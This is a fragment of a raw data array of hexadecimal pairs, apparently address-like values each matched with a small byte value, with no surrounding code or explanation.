0x00F128D0, 0x0000002E, 0x00F0D7B0, 0x00000075, 0x00F0A0D8, 0x0000001A, 0x00F0E140, 0x0000001F, 0x00F0FAE8, 0x00000060, 0x00F0A4E0, 0x0000004D, 0x00F09838, 0x0000000C, 0x00F0D5B8, 0x00000077, 0x00F0EDF0, 0x0000002C, 0x00F0F0A0, 0x00000025, 0x00F0E6E8, 0x00000070, 0x00F0CE88, 0x00000034, 0x00F0D7F0, 0x00000034, 0x00F11A58, 0x0000004C, 0x00F0B5C0, 0x00000032, 0x00F11D30, 0x00000032, 0x00F10F90, 0x0000003D, 0x00F100D0, 0x00000057, 0x00F12AF8, 0x00000034, 0x00F0A510, 0x0000003E, 0x00F0CB50, 0x00000003, 0x00F114F8, 0x0000004C, 0x00F0FC18, 0x00000076, 0x00F0CDE0, 0x00000077, 0x00F0F010, 0x0000002E, 0x00F0E018, 0x00000062, 0x00F0EA20, 0x00000062, 0x00F0CE88, 0x00000070, 0x00F120E8, 0x0000006F, 0x00F10968, 0x0000005F, 0x00F0CB68, 0x00000033, 0x00F11E70, 0x00000056, 0x00F093A8, 0x00000041, 0x00F0F6B0, 0x00000018, 0x00F0C1D8, 0x00000000, 0x00F0C6C8, 0x0000003C, 0x00F12460, 0x0000002E, 0x00F0BAD8, 0x00000014, 0x00F09110, 0x0000005E, 0x00F09B48, 0x00000022, 0x00F129F0, 0x0000005C, 0x00F0CDB0, 0x00000053, 0x00F09940, 0x00000035, 0x00F0CAC8, 0x00000068, 0x00F11868, 0x0000001E, 0x00F0B4A8, 0x00000022, 0x00F118F8, 0x0000001D, 0x00F0C490, 0x0000001E, 0x00F0D758, 0x00000026, 0x00F0AD50, 0x00000026, 0x00F0C480, 0x00000071, 0x00F129B0, 0x0000003B, 0x00F0E8E0, 0x0000006C, 0x00F0EEC8, 0x0000007E, 0x00F0B0D8, 0x00000072, 0x00F0B268, 0x0000001A, 0x00F11390, 0x0000001E, 0x00F122E8, 0x00000078, 0x00F0A900, 0x0000000E, 0x00F107D8, 0x0000000D, 0x00F0E9B0, 0x0000003A, 0x00F096D8, 0x00000004, 0x00F0A488, 0x00000050, 0x00F0CAC0, 0x0000000A, 0x00F0D030, 0x00000048, 0x00F09C70, 0x00000020, 0x00F10868, 0x00000066, 0x00F12778, 0x0000007A, 0x00F0DF88, 0x00000031, 0x00F11BC8, 0x0000000D, 0x00F0E5F8, 0x00000048, 0x00F09700, 0x00000030, 0x00F126E0, 0x00000040, 0x00F0E780, 0x00000004, 0x00F0F1A0, 0x00000002, 0x00F0C5F0, 0x00000075, 0x00F0CF48, 0x0000002D, 0x00F0E000, 0x0000001A, 0x00F0D9C8, 0x0000001A, 0x00F0B5C8, 0x0000003A, 0x00F0ED98, 0x00000064, 0x00F12350, 0x00000040, 0x00F0CC58, 0x00000027, 0x00F0FDE8, 0x0000006B, 0x00F10D20, 0x00000056, 0x00F09460, 0x0000006B, 0x00F0E4A8, 0x00000063, 0x00F0C190, 0x0000005E, 0x00F0C578, 0x00000072, 0x00F0DF78, 0x00000045, 0x00F0A3F0, 0x00000006, 0x00F0C590, 0x00000064, 0x00F0DDF0, 0x00000044, 0x00F0E710, 0x00000022, 0x00F10F80, 0x0000002E, 0x00F0CA30, 0x0000007D, 0x00F122E0, 0x00000026, 0x00F0B3F0, 0x00000074, 0x00F0C208, 0x0000005A, 0x00F10E48, 0x00000024, 0x00F0B460, 0x0000001D, 0x00F0AD00, 0x0000006A, 0x00F102F0, 0x00000025, 0x00F0DB58, 0x00000041, 0x00F0A948, 0x00000054, 0x00F0D450, 0x0000003C, 0x00F11098, 0x00000001, 0x00F0F7F8, 0x00000043, 0x00F0F3E0, 0x00000035, 0x00F10198, 0x00000008, 0x00F0D6E8, 0x00000024, 0x00F0A168, 0x00000043, 0x00F11C08, 0x00000019, 0x00F0FAD0, 0x00000048, 0x00F0F3C8, 0x0000001A, 0x00F0C908, 0x0000005D, 0x00F0EB50, 0x0000002F, 0x00F12378, 0x00000007, 0x00F0BA48, 0x00000061, 0x00F11B18, 0x00000022, 0x00F0CA58, 0x00000069, 0x00F0AC10, 0x0000000E, 0x00F0B5B0, 0x00000036, 0x00F0A368, 0x00000024, 0x00F0C9A0, 0x0000001C, 0x00F126C8, 0x00000054, 0x00F09808, 0x00000003, 0x00F0DA80, 0x0000002B, 0x00F0B5D0, 0x00000038, 0x00F11AF0, 0x00000077, 0x00F0C440, 0x00000062, 0x00F0E9F8, 0x00000003, 0x00F0EEF0, 0x0000001F, 0x00F0EFF8, 0x00000062, 0x00F0E678, 0x0000004C, 0x00F0B350, 0x00000071, 0x00F0A460, 0x0000001D, 0x00F09B68, 0x00000004, 0x00F0CD68, 0x00000059, 0x00F0C0A0, 0x00000040, 0x00F0D3E8, 0x00000004, 0x00F09930, 0x0000003F, 0x00F12798, 0x00000033, 0x00F09830, 0x00000075, 0x00F0DFB0, 0x00000065, 0x00F0BB18, 0x00000062, 0x00F0E500, 0x00000018, 0x00F0C150, 0x0000001F, 0x00F096F8, 0x00000068, 0x00F11D90, 0x00000045, 0x00F09400, 0x00000005, 0x00F12800, 0x00000043, 0x00F0A460, 0x00000043, 0x00F0F3A0, 0x00000015, 0x00F0C2C0, 0x00000004, 0x00F10120, 0x00000079, 0x00F0B4C0, 0x00000057, 0x00F0F3C0, 0x0000002A, 0x00F0ABE0, 0x00000007, 0x00F0E4B0, 0x00000010, 0x00F10968, 0x00000064, 0x00F0A1F8, 0x00000011, 0x00F0A248, 0x00000006, 0x00F0C908, 0x00000066, 0x00F12468, 0x00000069, 0x00F10FB0, 0x00000026, 0x00F098D8, 0x00000015, 0x00F12428, 0x0000005B, 0x00F0DCA8, 0x00000018, 0x00F0C5C0, 0x0000005C, 0x00F11D40, 0x00000034, 0x00F09DB0, 0x00000057, 0x00F0CA60, 0x0000006A, 0x00F0F188, 0x00000017, 0x00F0D5D8, 0x0000003D, 0x00F0A110, 0x0000000E, 0x00F0D380, 0x00000067, 0x00F0D0E0, 0x00000032, 0x00F09710, 0x00000065, 0x00F0ABF0, 0x00000039, 0x00F0EB08, 0x0000006F, 0x00F10428, 0x0000001E, 0x00F0DDC8, 0x00000068, 0x00F0C250, 0x0000001D, 0x00F11828, 0x0000003F, 0x00F113F8, 0x0000001F, 0x00F09528, 0x00000057, 0x00F0EB80, 0x0000000F, 0x00F10790, 0x0000007E, 0x00F0B340, 0x00000039, 0x00F0B8C8, 0x00000075, 0x00F0EC48, 0x0000002A, 0x00F0F138, 0x00000008, 0x00F0A500, 0x00000021, 0x00F0EBE0, 0x0000004F, 0x00F10980, 0x0000001B, 0x00F0BED8, 0x0000002D, 0x00F0B8F0, 0x0000006D, 0x00F0A408, 0x00000057, 0x00F0DCA8, 0x0000001B, 0x00F0B660, 0x00000046, 0x00F0BE58, 0x0000004B, 0x00F09EF0, 0x0000003B, 0x00F0E198, 0x00000078, 0x00F0D210, 0x0000003A, 0x00F097A8, 0x00000063, 0x00F0A5F0, 0x0000003C, 0x00F12358, 0x00000046, 0x00F09608, 0x00000042, 0x00F0E168, 0x0000005E, 0x00F0A6F8, 0x0000004B, 0x00F104F8, 0x0000003B, 0x00F11910, 0x0000003A, 0x00F0D708, 0x00000003, 0x00F0B0A0, 0x00000024, 0x00F0D138, 0x0000000C, 0x00F0FAD8, 0x00000021, 0x00F09618, 0x00000071, 0x00F0BE60, 0x00000019, 0x00F118C0, 0x00000014, 0x00F0E818, 0x0000002C, 0x00F12AC0, 0x00000015, 0x00F09D88, 0x00000005, 0x00F09480, 0x00000072, 0x00F0B538, 0x00000003, 0x00F0E748, 0x00000011, 0x00F0DDD0, 0x00000044, 0x00F0C718, 0x0000006D, 0x00F0E278, 0x0000001B, 0x00F0EB70, 0x0000006D, 0x00F12108, 0x0000006F, 0x00F09C48, 0x00000050, 0x00F0E8C8, 0x0000002A, 0x00F10E30, 0x00000053, 0x00F129B0, 0x00000014, 0x00F12828, 0x0000000C, 0x00F0EF68, 0x00000045, 0x00F0C588, 0x00000076, 0x00F0DA50, 0x0000002A, 0x00F0DCC0, 0x00000060, 0x00F0C240, 0x00000016, 0x00F0AC70, 0x00000009, 0x00F10BA8, 0x00000013, 0x00F10620, 0x0000002F, 0x00F0C390, 0x00000036, 0x00F117A8, 0x00000067, 0x00F12588, 0x0000004D, 0x00F09290, 0x0000006D, 0x00F121B8, 0x00000027, 0x00F0F230, 0x00000052, 0x00F0C2A8, 0x00000034, 0x00F0DB60, 0x00000031, 0x00F10450, 0x00000068, 0x00F0A500, 0x00000055, 0x00F0A9D8, 0x0000006E, 0x00F11958, 0x0000006A, 0x00F0FDA8, 0x00000036, 0x00F09998, 0x00000043, 0x00F107C8, 0x00000070, 0x00F10CD0, 0x00000028, 0x00F0A2D0, 0x00000061, 0x00F0B7B0, 0x00000057, 0x00F0C520, 0x00000033, 0x00F12C48, 0x00000015, 0x00F0D828, 0x00000041, 0x00F0DA90, 0x0000007B, 0x00F0D0C0, 0x00000069, 0x00F0D120, 0x00000000, 0x00F10C78, 0x00000059, 0x00F10BA8, 0x00000026, 0x00F09788, 0x0000007D, 0x00F0D0C8, 0x00000015, 0x00F0D528, 0x00000003, 0x00F0B940, 0x0000005A, 0x00F0E3F0, 0x00000006, 0x00F0D4E8, 0x00000025, 0x00F10178, 0x00000053, 0x00F09E08, 0x00000044, 0x00F0A888, 0x00000001, 0x00F0A7C0, 0x0000001C, 0x00F0A7D0, 0x00000011, 0x00F0CF50, 0x00000004, 0x00F122C0, 0x00000010, 0x00F0E9A0, 0x00000018, 0x00F0C7F8, 0x00000046, 0x00F09480, 0x0000000B, 0x00F0CD38, 0x00000069, 0x00F0D4D0, 0x00000009, 0x00F11FC8, 0x00000004, 0x00F0FD68, 0x00000019, 0x00F0A698, 0x0000005D, 0x00F09FF0, 0x00000018, 0x00F11358, 0x00000032, 0x00F0D7B0, 0x00000060, 0x00F0D100, 0x0000007A, 0x00F120F0, 0x00000006, 0x00F09F78, 0x0000000F, 0x00F09BB0, 0x00000049, 0x00F0CF28, 0x00000065, 0x00F0F670, 0x00000041, 0x00F0A240, 0x00000046, 0x00F0CF48, 0x00000048, 0x00F12398, 0x0000002E, 0x00F0AFF8, 0x0000001F, 0x00F09888, 0x00000028, 0x00F09290, 0x00000071, 0x00F0F808, 0x0000006A, 0x00F0D2D8, 0x00000024, 0x00F0C858, 0x00000004, 0x00F0CDA8, 0x00000009, 0x00F09858, 0x00000054, 0x00F0A510, 0x00000075, 0x00F0FE98, 0x00000022, 0x00F10970, 0x0000004C, 0x00F0C6B0, 0x00000015, 0x00F09608, 0x0000006F, 0x00F09B50, 0x00000056, 0x00F10800, 0x0000004D, 0x00F111A8, 0x00000030, 0x00F0BD30, 0x00000050, 0x00F09C20, 0x0000004B, 0x00F0B7F8, 0x0000007B, 0x00F0A080, 0x0000000F, 0x00F0E1E8, 0x0000000C, 0x00F0BC08, 0x0000003D, 0x00F0A1B8, 0x0000003F, 0x00F0ECB8, 0x00000021, 0x00F0B7F0, 0x0000003F, 0x00F12138, 0x00000013, 0x00F105D0, 0x0000003B, 0x00F0B658, 0x0000002E, 0x00F0B228, 0x0000003C, 0x00F0D330, 0x0000005F, 0x00F0C8B0, 0x00000030, 0x00F0B030, 0x00000039, 0x00F09BC0, 0x0000003F, 0x00F0C1D8, 0x00000029, 0x00F0BFA0, 0x00000077, 0x00F113B0, 0x0000000C, 0x00F0F068, 0x0000003F, 0x00F0D8A8, 0x00000038, 0x00F10A10, 0x0000002E, 0x00F0BAF8, 0x00000061, 0x00F0C4C8, 0x00000057, 0x00F0A4D8, 0x00000017, 0x00F12990, 0x0000006D, 0x00F121F0, 0x00000029, 0x00F0A790, 0x00000069, 0x00F0DCE0, 0x0000002B, 0x00F0AA88, 0x0000002E, 0x00F0B9B0, 0x00000079, 0x00F0BB70, 0x00000039, 0x00F0E268, 0x0000006B, 0x00F10AC8, 0x0000004D, 0x00F11430, 0x00000010, 0x00F0DDC8, 0x0000004F, 0x00F106F8, 0x00000034, 0x00F11578, 0x00000028, 0x00F0DAC8, 0x0000007A, 0x00F0A018, 0x0000005F, 0x00F0FA30, 0x0000004B, 0x00F0BC70, 0x0000005B, 0x00F0CEA0, 0x0000006B, 0x00F11E40, 0x0000005E, 0x00F0C1D8, 0x00000072, 0x00F0F950, 0x00000031, 0x00F11FA0, 0x00000011, 0x00F126B0, 0x00000030, 0x00F0C458, 0x00000022, 0x00F10030, 0x0000000F, 0x00F0D770, 0x0000002F, 0x00F0E218, 0x0000007D, 0x00F0D4F0, 0x0000005D, 0x00F0F2B8, 0x00000026, 0x00F0CF68, 0x0000003F, 0x00F0ABE0, 0x0000001C, 0x00F10C00, 0x00000034, 0x00F0D330, 0x0000002D, 0x00F11C80, 0x00000038, 0x00F0B678, 0x0000002D, 0x00F10220, 0x00000053, 0x00F0D410, 0x00000044, 0x00F0B148, 0x00000001, 0x00F0D310, 0x00000041, 0x00F11CA0, 0x00000046, 0x00F0E0D8, 0x00000074, 0x00F0CD78, 0x00000069, 0x00F10248, 0x0000002D, 0x00F10790, 0x00000046, 0x00F0A748, 0x0000004D, 0x00F0CEA0, 0x00000062, 0x00F11720, 0x00000000, 0x00F0B658, 0x0000003B, 0x00F0CA58, 0x0000002F, 0x00F10000, 0x00000045, 0x00F10EF8, 0x00000012, 0x00F0F470, 0x00000052, 0x00F09B40, 0x00000022, 0x00F0A3A0, 0x00000032, 0x00F0E348, 0x0000002E, 0x00F10FC8, 0x00000037, 0x00F0B3C8, 0x0000005C, 0x00F12600, 0x00000020, 0x00F0EEE8, 0x0000006E, 0x00F12720, 0x00000067, 0x00F123A0, 0x00000065, 0x00F09BB0, 0x00000008, 0x00F094A0, 0x00000023, 0x00F0B2E0, 0x00000037, 0x00F11E58, 0x00000051, 0x00F09AE0, 0x0000002B, 0x00F0DCC0, 0x0000006A, 0x00F11310, 0x00000060, 0x00F12258, 0x00000024, 0x00F0E7F0, 0x00000078, 0x00F0ED10, 0x00000063, 0x00F0A008, 0x0000003D, 0x00F12530, 0x00000053, 0x00F0CD10, 0x00000021, 0x00F10770, 0x00000072, 0x00F0A9A0, 0x00000025, 0x00F103D0, 0x00000065, 0x00F09B90, 0x00000032, 0x00F0F710, 0x00000041, 0x00F11DB0, 0x00000063, 0x00F0B500, 0x00000036, 0x00F0B0A8, 0x00000067, 0x00F0F150, 0x00000044, 0x00F09E38, 0x00000050, 0x00F0A2A8, 0x00000054, 0x00F0C7F0, 0x00000013, 0x00F10038, 0x00000075, 0x00F0C0E8, 0x00000008, 0x00F12920, 0x00000005, 0x00F11460, 0x00000024, 0x00F0CB60, 0x0000001C, 0x00F0D588, 0x00000047, 0x00F0A010, 0x00000062, 0x00F0E240, 0x00000052, 0x00F0AF78, 0x00000045, 0x00F0C530, 0x00000063, 0x00F11240, 0x0000001D, 0x00F0B058, 0x00000066, 0x00F10930, 0x0000004E, 0x00F095F0, 0x00000060, 0x00F0B168, 0x00000061, 0x00F0CB68, 0x00000020, 0x00F11DB8, 0x0000001F, 0x00F107A8, 0x0000002F, 0x00F0D388, 0x0000004C, 0x00F11738, 0x00000044, 0x00F0BFB0, 0x0000006D, 0x00F0D560, 0x00000002, 0x00F0D458, 0x00000022, 0x00F0CB90, 0x00000041, 0x00F119E0, 0x0000003C, 0x00F0A1B8, 0x00000043, 0x00F0DA28, 0x00000077, 0x00F0AAA8, 0x00000078, 0x00F12890, 0x00000064, 0x00F0D0F8, 0x00000039, 0x00F0E5D8, 0x0000001F, 0x00F0C1D8, 0x0000002E, 0x00F0BD10, 0x00000043, 0x00F0E3C0, 0x00000033, 0x00F112B8, 0x0000002C, 0x00F0E910, 0x00000007, 0x00F0BE70, 0x00000016, 0x00F0A0A0, 0x0000006B, 0x00F0E5F8, 0x0000000F, 0x00F0AB70, 0x0000003A, 0x00F0BBF8, 0x00000060, 0x00F0A3B8, 0x00000077, 0x00F119E8, 0x00000055, 0x00F0A520, 0x00000056, 0x00F11000, 0x00000004, 0x00F0BA88, 0x00000065, 0x00F0ADF0, 0x0000000F, 0x00F11C78, 0x0000002D, 0x00F0E6C0, 0x0000006D, 0x00F10C78, 0x0000007C, 0x00F0D6E8, 0x0000004B, 0x00F09230, 0x00000057, 0x00F10AD8, 0x00000069, 0x00F0DA50, 0x00000009, 0x00F0E3A8, 0x0000003B, 0x00F11060, 0x00000066, 0x00F0F5D0, 0x0000000F, 0x00F0DBB0, 0x0000005B, 0x00F0E0D0, 0x00000076, 0x00F099F8, 0x00000022, 0x00F0E930, 0x0000005B, 0x00F0BFE0, 0x00000060, 0x00F0B940, 0x00000055, 0x00F11990, 0x00000079, 0x00F0F208, 0x00000054, 0x00F09508, 0x0000005D, 0x00F0DD50, 0x00000077, 0x00F0F198, 0x0000000F, 0x00F0C268, 0x00000067, 0x00F0C728, 0x00000044, 0x00F0B2E8, 0x00000062, 0x00F11028, 0x00000053, 0x00F0C918, 0x00000051, 0x00F0DDE8, 0x00000032, 0x00F0A3D8, 0x0000003E, 0x00F0DF78, 0x00000062, 0x00F0DFF0, 0x00000039, 0x00F117D0, 0x00000003, 0x00F126C0, 0x00000043, 0x00F0BD58, 0x00000056, 0x00F0B2E8, 0x0000004E, 0x00F0CB38, 0x00000009, 0x00F10D00, 0x0000002D, 0x00F0C080, 0x00000065, 0x00F0D960, 0x00000032, 0x00F0ADF0, 0x00000070, 0x00F0CDB8, 0x00000064, 0x00F0CC40, 0x0000007A, 0x00F0C8A0, 0x00000057, 0x00F0EA20, 0x0000002C, 0x00F11600, 0x0000003A, 0x00F0BD18, 0x00000009, 0x00F0DC30, 0x00000017, 0x00F09AC0, 0x00000014, 0x00F0E5F8, 0x0000004D, 0x00F10458, 0x00000071, 0x00F12460, 0x00000063, 0x00F0F188, 0x00000023, 0x00F0B9B0, 0x0000000B, 0x00F0D830, 0x00000004, 0x00F11E48, 0x0000001C, 0x00F0C068, 0x00000044, 0x00F0E898, 0x0000004E, 0x00F0D2F8, 0x0000003A, 0x00F0ECD8, 0x00000076, 0x00F0D490, 0x00000057, 0x00F0A680, 0x0000001E, 0x00F0B860, 0x00000071, 0x00F09300, 0x00000017, 0x00F108C8, 0x00000043, 0x00F0D798, 0x00000013, 0x00F10B08, 0x00000058, 0x00F0B0F0, 0x0000003D, 0x00F0C0F0, 0x00000030, 0x00F12860, 0x0000005A, 0x00F124A0, 0x00000075, 0x00F0C550, 0x00000016, 0x00F09288, 0x00000064, 0x00F0B050, 0x00000050, 0x00F0FA38, 0x00000059, 0x00F0FB50, 0x0000002E, 0x00F09180, 0x00000035, 0x00F10FE8, 0x00000045, 0x00F0C010, 0x0000005A, 0x00F09D58, 0x00000003, 0x00F0CD58, 0x00000027, 0x00F0D128, 0x0000005A, 0x00F11B30, 0x0000000A, 0x00F0AE20, 0x0000002E, 0x00F10530, 0x00000025, 0x00F0CED0, 0x0000000D, 0x00F093D8, 0x00000030, 0x00F0A480, 0x0000003F, 0x00F12198, 0x0000005A, 0x00F12690, 0x00000047, 0x00F0C710, 0x00000007, 0x00F0AAC0, 0x00000029, 0x00F11728, 0x00000026, 0x00F12CB0, 0x00000035, 0x00F0ECA0, 0x0000006E, 0x00F10AB8, 0x0000004C, 0x00F0F5B0, 0x0000003B, 0x00F0B128, 0x00000013, 0x00F0D708, 0x00000068, 0x00F0E460, 0x00000035, 0x00F0C490, 0x00000056, 0x00F106C0, 0x00000038, 0x00F12690, 0x00000011, 0x00F0A120, 0x0000005F, 0x00F0D410, 0x00000018, 0x00F11A20, 0x00000036, 0x00F09540, 0x00000058, 0x00F11EA8, 0x00000034, 0x00F10AD0, 0x00000077, 0x00F0A0D8, 0x0000001B, 0x00F0D090, 0x0000003D, 0x00F10AA0, 0x0000000E, 0x00F09498, 0x00000068, 0x00F0A7A0, 0x00000052, 0x00F0D918, 0x0000003D, 0x00F0E938, 0x00000072, 0x00F0FA10, 0x00000007, 0x00F0B130, 0x0000001D, 0x00F0D250, 0x0000005B, 0x00F0C3E0, 0x00000061, 0x00F0D678, 0x00000076, 0x00F0D040, 0x00000045, 0x00F0D6C0, 0x0000004F, 0x00F0A448, 0x00000047, 0x00F0C0B8, 0x0000005F, 0x00F0CCA8, 0x0000004B, 0x00F0C470, 0x00000040, 0x00F0D210, 0x00000006, 0x00F0A0D0, 0x0000007A, 0x00F0ED80, 0x00000055, 0x00F0F2E0, 0x0000003E, 0x00F099F0, 0x00000034, 0x00F0B6E8, 0x0000005C, 0x00F0B120, 0x00000027, 0x00F0E510, 0x00000040, 0x00F0C108, 0x0000005C, 0x00F0B148, 0x00000039, 0x00F0AAB8, 0x00000047, 0x00F0A918, 0x00000050, 0x00F0B9A0, 0x00000001, 0x00F09C58, 0x00000076, 0x00F12310, 0x00000043, 0x00F0F128, 0x00000059, 0x00F12388, 0x00000023, 0x00F0F890, 0x00000029, 0x00F0F650, 0x00000006, 0x00F11CD8, 0x00000005, 0x00F09378, 0x0000006B, 0x00F0DFA0, 0x00000066, 0x00F12410, 0x00000065, 0x00F0CCE0, 0x00000050, 0x00F0A560, 0x0000000E, 0x00F0A948, 0x0000000B, 0x00F10378, 0x0000003A, 0x00F0F348, 0x0000002D, 0x00F0B370, 0x0000002D, 0x00F0EC30, 0x00000041, 0x00F0FE98, 0x00000026, 0x00F0B6D0, 0x0000004F, 0x00F0CA88, 0x00000071, 0x00F0B820, 0x00000012, 0x00F0B958, 0x00000070, 0x00F122C8, 0x00000016, 0x00F0C7E0, 0x00000034, 0x00F0B4B0, 0x0000001E, 0x00F090C8, 0x0000000F, 0x00F0EFE8, 0x0000000A, 0x00F0E6E0, 0x00000059, 0x00F12338, 0x0000007C, 0x00F0D2D0, 0x0000003C, 0x00F112C8, 0x0000001C, 0x00F0EBF8, 0x00000036, 0x00F11B48, 0x0000002D, 0x00F0D9C0, 0x00000041, 0x00F0B358, 0x00000056, 0x00F09E50, 0x0000002C, 0x00F0AAB8, 0x0000003A, 0x00F0B188, 0x0000004D, 0x00F0D5E8, 0x00000058, 0x00F0B060, 0x00000053, 0x00F0CF20, 0x00000064, 0x00F11FB8, 0x00000007, 0x00F0A5B8, 0x00000053, 0x00F11B80, 0x0000004D, 0x00F114D0, 0x00000007, 0x00F0DDF8, 0x0000001A, 0x00F106D8, 0x0000003A, 0x00F0DD78, 0x00000038, 0x00F0C560, 0x00000010, 0x00F105D0, 0x00000006, 0x00F0EE00, 0x00000006, 0x00F10E20, 0x00000037, 0x00F0FDE0, 0x00000011, 0x00F0A530, 0x00000078, 0x00F09880, 0x00000024, 0x00F100B0, 0x00000034, 0x00F0AF70, 0x00000000, 0x00F0BF68, 0x00000053, 0x00F12010, 0x00000079, 0x00F12110, 0x00000021, 0x00F122D0, 0x00000010, 0x00F0CE28, 0x00000045, 0x00F0B2C8, 0x00000011, 0x00F0E630, 0x0000006D, 0x00F0CDF0, 0x00000021, 0x00F0D978, 0x00000017, 0x00F10C50, 0x0000005E, 0x00F094F8, 0x0000001B, 0x00F0E810, 0x0000006B, 0x00F11348, 0x0000007C, 0x00F128D0, 0x00000032, 0x00F0AAA0, 0x0000006B, 0x00F0D818, 0x00000022, 0x00F0BA60, 0x00000028, 0x00F0CEA8, 0x00000030, 0x00F0F8C8, 0x00000030, 0x00F11F48, 0x0000005C, 0x00F0E130, 0x0000005B, 0x00F0F200, 0x0000000E, 0x00F0EBA8, 0x00000041, 0x00F110C0, 0x0000000A, 0x00F12208, 0x00000033, 0x00F0A888, 0x0000004B, 0x00F0EF60, 0x00000008, 0x00F0A1D0, 0x00000009, 0x00F0AF10, 0x00000004, 0x00F0A750, 0x00000023, 0x00F0BC68, 0x00000031, 0x00F0B318, 0x00000062, 0x00F10A10, 0x00000059, 0x00F12348, 0x00000015, 0x00F0EBA8, 0x00000003, 0x00F0FC20, 0x00000022, 0x00F12B88, 0x0000001C, 0x00F105D0, 0x00000009, 0x00F12BD0, 0x00000043, 0x00F096D0, 0x00000051, 0x00F09DF0, 0x0000004B, 0x00F0E0A0, 0x0000001C, 0x00F0BDC8, 0x00000059, 0x00F10F20, 0x0000000D, 0x00F0B940, 0x00000067, 0x00F0AE80, 0x00000007, 0x00F0D8C8, 0x0000006B, 0x00F0CE00, 0x00000040, 0x00F0E288, 0x0000006A, 0x00F0CDB0, 0x0000002E, 0x00F0C9F0, 0x00000042, 0x00F0DC30, 0x00000079, 0x00F0C730, 0x00000071, 0x00F0C078, 0x00000040, 0x00F0F3F8, 0x0000002B, 0x00F0FA18, 0x0000006E, 0x00F0DC40, 0x0000006F, 0x00F10360, 0x00000009, 0x00F0DEB8, 0x0000000F, 0x00F0D3B8, 0x00000009, 0x00F121A8, 0x00000023, 0x00F091A8, 0x0000004C, 0x00F10BC0, 0x00000027, 0x00F0C1F8, 0x00000023, 0x00F0DD80, 0x00000004, 0x00F0D298, 0x00000067, 0x00F09AE0, 0x00000048, 0x00F09AE8, 0x00000067, 0x00F115E8, 0x0000006D, 0x00F0DBB8, 0x0000005C, 0x00F096D0, 0x00000056, 0x00F0E758, 0x0000003E, 0x00F0B030, 0x00000061, 0x00F09A00, 0x00000032, 0x00F0A3B8, 0x00000052, 0x00F12460, 0x0000006F, 0x00F12340, 0x00000060, 0x00F09C48, 0x00000053, 0x00F0FC10, 0x00000014, 0x00F0AF98, 0x0000005D, 0x00F0AAF0, 0x00000075, 0x00F11480, 0x00000015, 0x00F0DFB8, 0x00000011, 0x00F0E0C8, 0x00000051, 0x00F100B0, 0x00000050, 0x00F12408, 0x0000006B, 0x00F0BFA8, 0x0000004C, 0x00F10018, 0x00000003, 0x00F11078, 0x00000003, 0x00F0A0C8, 0x00000023, 0x00F110C0, 0x00000077, 0x00F12A90, 0x00000023, 0x00F0D348, 0x0000006D, 0x00F0FDD8, 0x00000058, 0x00F11038, 0x00000010, 0x00F09190, 0x00000026, 0x00F0B3A8, 0x00000039, 0x00F0BDB0, 0x00000077, 0x00F09D78, 0x0000003F, 0x00F0E758, 0x0000000D, 0x00F0D648, 0x00000074, 0x00F0BE68, 0x00000064, 0x00F09D70, 0x0000003F, 0x00F0CD58, 0x00000066, 0x00F106A8, 0x00000060, 0x00F09B30, 0x0000004C, 0x00F0AA08, 0x00000075, 0x00F0CC10, 0x00000066, 0x00F0A940, 0x00000040, 0x00F0B2E0, 0x0000000C, 0x00F12538, 0x0000001F, 0x00F0B7A0, 0x0000001C, 0x00F10220, 0x0000006E, 0x00F0D2A8, 0x00000030, 0x00F09F20, 0x00000025, 0x00F0FAD8, 0x00000053, 0x00F112B0, 0x0000006A, 0x00F0EFE0, 0x00000026, 0x00F0AA78, 0x00000005, 0x00F0DA10, 0x00000002, 0x00F101F8, 0x0000002D, 0x00F09DC0, 0x00000008, 0x00F113E0, 0x0000006E, 0x00F10158, 0x00000067, 0x00F0DFF0, 0x00000077, 0x00F09218, 0x0000007E, 0x00F10950, 0x0000006C, 0x00F10610, 0x0000004A, 0x00F0DB58, 0x0000005C, 0x00F0BDA0, 0x0000004C, 0x00F09AB0, 0x00000036, 0x00F0DA80, 0x00000045, 0x00F126A8, 0x00000063, 0x00F0C6F0, 0x00000078, 0x00F0C6B8, 0x0000001E, 0x00F0A988, 0x0000004D, 0x00F102A8, 0x00000049, 0x00F0B1B8, 0x00000016, 0x00F0A180, 0x0000002E, 0x00F0FD70, 0x0000003D, 0x00F12188, 0x00000058, 0x00F0FFC8, 0x0000002C, 0x00F0AE48, 0x0000004B, 0x00F12AA0, 0x0000001D, 0x00F0B510, 0x00000075, 0x00F126E0, 0x00000044, 0x00F09EA8, 0x0000000D, 0x00F0CCD0, 0x0000006E, 0x00F11770, 0x0000003B, 0x00F12C50, 0x00000009, 0x00F12AB0, 0x00000031, 0x00F0C0F8, 0x0000002E, 0x00F0F078, 0x00000037, 0x00F11AD0, 0x0000001D, 0x00F0C628, 0x00000022, 0x00F116D0, 0x00000067, 0x00F11090, 0x00000052, 0x00F090F0, 0x00000077, 0x00F0A410, 0x00000036, 0x00F0F308, 0x0000006F, 0x00F09608, 0x00000053, 0x00F11C60, 0x00000071, 0x00F0BB90, 0x00000075, 0x00F0D118, 0x00000040, 0x00F0C108, 0x00000070, 0x00F128C8, 0x00000072, 0x00F0E918, 0x0000000F, 0x00F12968, 0x0000006F, 0x00F0F128, 0x00000023, 0x00F0A408, 0x00000033, 0x00F096D0, 0x00000067, 0x00F10640, 0x00000048, 0x00F0D348, 0x0000007E, 0x00F0ED48, 0x0000002B, 0x00F0F130, 0x00000052, 0x00F0FA08, 0x00000000, 0x00F0B240, 0x00000034, 0x00F093A8, 0x0000001C, 0x00F0CED8, 0x00000058, 0x00F0C0C0, 0x00000015, 0x00F11F78, 0x00000030, 0x00F0AC90, 0x0000002F, 0x00F0FC40, 0x0000002B, 0x00F11910, 0x00000048, 0x00F10138, 0x00000062, 0x00F11A70, 0x0000004D, 0x00F0EE88, 0x0000003D, 0x00F11C80, 0x00000030, 0x00F0BD38, 0x00000019, 0x00F0E9D0, 0x0000007B, 0x00F0BC30, 0x0000006A, 0x00F0A070, 0x00000076, 0x00F12538, 0x00000000, 0x00F0C038, 0x0000006D, 0x00F0FDD0, 0x0000004B, 0x00F0EBE0, 0x0000002E, 0x00F0A530, 0x0000004C, 0x00F0C470, 0x00000027, 0x00F0E220, 0x0000002A, 0x00F11EC0, 0x00000052, 0x00F0BEE8, 0x00000071, 0x00F0DBF0, 0x0000004C, 0x00F0B148, 0x0000000E, 0x00F0FBC8, 0x00000055, 0x00F0B2D0, 0x00000006, 0x00F0CE90, 0x00000002, 0x00F10240, 0x00000073, 0x00F0C0E8, 0x00000064, 0x00F0B978, 0x0000004A, 0x00F0E4C8, 0x0000007E, 0x00F09E68, 0x0000000F, 0x00F0CFA8, 0x00000038, 0x00F11000, 0x00000041, 